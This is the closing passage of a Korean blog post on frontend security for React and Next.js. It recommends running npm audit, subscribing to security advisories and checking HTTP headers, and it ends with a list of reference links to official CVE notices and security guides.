2025년에는 React와 Next.js에서 CVSS 10.0짜리 취약점이 나왔고, npm 생태계의 핵심 패키지들이 탈취됐습니다. 우리가 매일 사용하는 프레임워크가 공격 대상이 됩니다.

지금 당장 시작할 수 있는 세 가지만 해두세요.

1. `npm audit` 실행 — 현재 프로젝트의 알려진 취약점 확인
2. GitHub Security Advisories 구독 — React, Next.js 저장소에서 Security Alerts 알림 설정
3. `securityheaders.com` 확인 — 운영 중인 서비스의 헤더 등급 점검

보안은 한 번에 완성되지 않습니다. 하지만 오늘 이 체크리스트를 팀의 PR 리뷰 기준에 포함시키는 것만으로도, 내일의 서비스는 오늘보다 훨씬 안전해집니다.

---

## 참고 자료

- [Next.js CSP 공식 문서](https://nextjs.org/docs/app/guides/content-security-policy)
- [Next.js 보안 모델 (Sebastian Markbåge)](https://nextjs.org/blog/security-nextjs-server-components-actions)
- [CVE-2025-29927: Next.js Middleware Bypass](https://nextjs.org/blog/cve-2025-29927)
- [CVE-2025-55182: React Server Components RCE](https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components)
- [프론트엔드 API 키 유출 실태 (Cremit)](https://www.cremit.io/ko/blog/credential-leakage-risks-hiding-in-frontend-code)
- [Front-End Security Best Practices (SecureFlag)](https://blog.secureflag.com/2025/11/17/front-end-security-best-practices/)
- [npm Supply Chain 공격 대응 가이드 (Armorcode)](https://www.armorcode.com/blog/defending-against-npm-supply-chain-attacks-a-practical-guide)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
